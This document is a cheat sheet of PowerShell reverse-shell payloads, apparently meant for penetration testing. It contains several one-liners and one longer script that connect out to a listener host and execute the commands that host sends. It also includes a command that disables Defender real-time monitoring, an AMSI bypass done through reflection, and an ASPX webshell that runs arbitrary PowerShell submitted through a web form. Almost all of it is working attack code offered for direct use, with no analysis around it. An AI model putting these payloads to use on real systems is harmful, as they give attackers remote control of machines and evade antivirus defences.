**Powershell ReverseShell**
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
nc -lvnp PORT

=====================================================================================================================================================================

**Powershell ReverseShell 2**
powershell -nop -w hidden -c "IEX('[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true);$c=New-Object System.Net.Sockets.TcpClient(\"YOUR_LHOST\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.IO.StreamReader -ArgumentList $s,([Text.Encoding]::UTF8)).ReadToEnd();$p=\"PS $(whoami)@$(hostname)> \";iex $d;$o=iex $d|Out-String;$ob=[text.encoding]::UTF8.GetBytes($o+$p);$s.Write($ob,0,$ob.Length);$s.Flush()};$c.Close()"

=====================================================================================================================================================================

**Powershell ReverseShell 3**
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('172.20.1.145',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

=====================================================================================================================================================================

**PowerShell ReverseShell 4**
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

=====================================================================================================================================================================

**PowerShell ASPX ReverseShell**

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Collections.ObjectModel"%>
<%@ Import Namespace="System.Management.Automation"%>
<%@ Import Namespace="System.Management.Automation.Runspaces"%>
<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>

<!DOCTYPE html>

<script Language="c#" runat="server">

    private static string powershelled(string scriptText)
    {
        try
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(scriptText);
            pipeline.Commands.Add("Out-String");

            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
                stringBuilder.AppendLine(obj.ToString());

            return stringBuilder.ToString();
        }catch(Exception exception)
        {
            return string.Format("Error: {0}", exception.Message);
        }
    }
    
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Page.IsPostBack)
        {
            if(iTBox.Text.Length > 0)
            {
                oTBox.Text = powershelled(iTBox.Text.Trim());
                iTBox.Text = string.Empty;
            }
        }
    }
</script>

<html>
<head id="D34dHead" runat="server">
    <title>POWER!shelled</title>
</head>
<body>
    <form id="form1" runat="server">    
        <span>Index </span>
        <span>POWER!webshell</span>><br />
    <asp:TextBox ID="oTBox" runat="server" BackColor="Black" 
        Height="480px" ReadOnly="True" TextMode="MultiLine" Forecolor="Green"
        Width="1200px" ToolTip="POWER!shell output"></asp:TextBox>
    <br />
    <asp:TextBox ID="iTBox" runat="server" Width="1200px" 
        ToolTip="<POWER!shell command>"></asp:TextBox>
    </form>
</body>
</html>

=====================================================================================================================================================================

**Powershell Advanced ReverseShell**

# Configuration
$Config = @{
    LHOST = 'YOUR_LHOST'     # Listener IP
    LPORT = 4444             # Listener Port
    AMSIBypass = $true       # Enable AMSI bypass
}

function Disable-AMSI {
    if ($Config.AMSIBypass) {
        try {
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            Write-Host "[+] AMSI disabled" -ForegroundColor Green
        } catch {
            Write-Host "[!] AMSI bypass failed" -ForegroundColor Yellow
        }
    }
}

function Connect-ReverseShell {
    param($HostIP, $Port)
    
    try {
        $client = New-Object System.Net.Sockets.TcpClient($HostIP, $Port)
        $stream = $client.GetStream()
        Write-Host "[+] Connected to $HostIP`:$Port" -ForegroundColor Green
        
        return $stream
    } catch {
        Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Get-PSPrompt {
    $user = whoami
    $hostName = hostname
    $location = Get-Location
    return "PS $user@$hostName`:$($location.Path)> "
}

function Send-Command {
    param($Stream, $Command)
    
    $prompt = Get-PSPrompt
    $fullCmd = $prompt + $Command + "`n"
    $bytes = [Text.Encoding]::UTF8.GetBytes($fullCmd)
    $Stream.Write($bytes, 0, $bytes.Length)
    $Stream.Flush()
}

function Receive-Output {
    param($Stream)
    
    $reader = New-Object System.IO.StreamReader($Stream, [Text.Encoding]::UTF8)
    $output = $reader.ReadToEnd()
    return $output
}

function Invoke-ShellCommand {
    param($Stream, $Command)
    
    Send-Command -Stream $Stream -Command $Command
    return Receive-Output -Stream $Stream
}

# Disable AMSI
Disable-AMSI

# Connect to C2
$stream = Connect-ReverseShell -HostIP $Config.LHOST -Port $Config.LPORT

if ($stream) {
    [byte[]]$buffer = 0..65535 | %{0}
    
    while (($client.Connected -eq $true) -and (Read-Host -Prompt "Shell aktifdir. 'exit' yazaraq kənara çıxın")) {
        try {
            # Receive command
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -eq 0) { break }
            
            $command = [Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
            
            if ($command -eq 'exit') { break }
            
            # Execute command
            $result = Invoke-Expression $command 2>&1 | Out-String
            
            # Send result back
            $prompt = Get-PSPrompt
            $response = $result + $prompt
            $responseBytes = [Text.Encoding]::UTF8.GetBytes($response)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
            $stream.Flush()
            
        } catch {
            $errorMsg = $_.Exception.Message + "`n" + Get-PSPrompt
            $errorBytes = [Text.Encoding]::UTF8.GetBytes($errorMsg)
            $stream.Write($errorBytes, 0, $errorBytes.Length)
            $stream.Flush()
        }
    }
    
    $stream.Close()
    $client.Close()
    Write-Host "[+] Shell terminated" -ForegroundColor Yellow
} else {
    Write-Host "[!] Could not establish connection" -ForegroundColor Red
}

===================================================================================================================================================================

**AMSI Bypass**

param(
    [string]$LHOST = 'YOUR_LHOST',
    [string]$LPORT = '4444'
)

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Core Reverse Shell Logic (PentestMonkey Style - Optimized)
$client = New-Object System.Net.Sockets.TcpClient($LHOST, [int]$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.IO.StreamReader -ArgumentList $stream, ([Text.Encoding]::UTF8)).ReadToEnd().Trim()
    $prompt = "PS $(whoami)@$(hostname):$(Get-Location)> "
    
    try {
        $output = Invoke-Expression $data 2>&1 | Out-String
        $response = $output + $prompt
    } catch {
        $response = $_.Exception.Message + "`n" + $prompt
    }
    
    $sendbytes = ([text.encoding]::UTF8).GetBytes($response)
    $stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()
};$client.Close()


